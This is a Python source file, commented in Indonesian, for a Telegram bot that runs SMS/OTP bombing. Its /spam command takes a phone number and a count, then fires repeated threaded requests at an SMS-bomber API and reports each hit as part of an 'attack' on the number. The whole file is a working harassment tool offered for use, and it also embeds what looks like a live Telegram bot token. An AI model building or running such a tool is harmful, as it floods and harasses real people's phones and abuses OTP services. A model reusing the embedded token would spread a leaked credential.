import telebot
import requests
import threading
import time
import os

BOT_TOKEN = "8850847985:AAFmdu2kpn9dbdEEWzCwAOe0dhSsuE8c3ZY" 
bot = telebot.TeleBot(BOT_TOKEN)

# Ganti URL ini pake API SMS yang masih aktif
API_URL = "https://api.smsbomber.co/send" 

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Accept": "application/json",
    "Content-Type": "application/json"
}

def safe_reply(chat_id, text):
    try:
        bot.send_message(chat_id, text, timeout=15)
    except Exception as e:
        print(f"[!] Gagal ngirim pesan: {e}")

def format_phone(phone):
    if phone.startswith("0"): return "62" + phone[1:]
    elif phone.startswith("+62"): return phone.replace("+", "")
    return phone

def send_spam_api(chat_id, phone, index):
    try:
        payload = {"phone": phone, "count": 1}
        response = requests.post(API_URL, json=payload, headers=HEADERS, timeout=10)
        if response.status_code in [200, 201]:
            safe_reply(chat_id, f"✅ [{index}] Terkirim ke {phone}")
        else:
            safe_reply(chat_id, f"❌ [{index}] Gagal (HTTP {response.status_code})")
    except Exception:
        safe_reply(chat_id, f"❌ [{index}] Error API SMS")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Bot Spam OTP Nyx siap.\nKetik: `/spam 08123456789 10`", parse_mode="Markdown")

@bot.message_handler(commands=['spam'])
def handle_spam(message):
    try:
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, "Format: `/spam 08123456789`", parse_mode="Markdown")
            return
        phone = format_phone(args[1])
        count = int(args[2]) if len(args) > 2 else 5
        chat_id = message.chat.id
        
        safe_reply(chat_id, f"🚀 Memulai serangan ke {phone} sebanyak {count}x...")
        
        for i in range(1, count + 1):
            t = threading.Thread(target=send_spam_api, args=(chat_id, phone, i))
            t.start()
            time.sleep(0.5)
    except Exception as e:
        safe_reply(message.chat.id, f"Error: {str(e)}")

print("[*] Bot berjalan di VPS...")
while True:
    try:
        bot.infinity_polling(timeout=20, long_polling_timeout=10)
    except Exception as e:
        print(f"[!] Error koneksi: {e}. Restart dalam 5 detik...")
        time.sleep(5)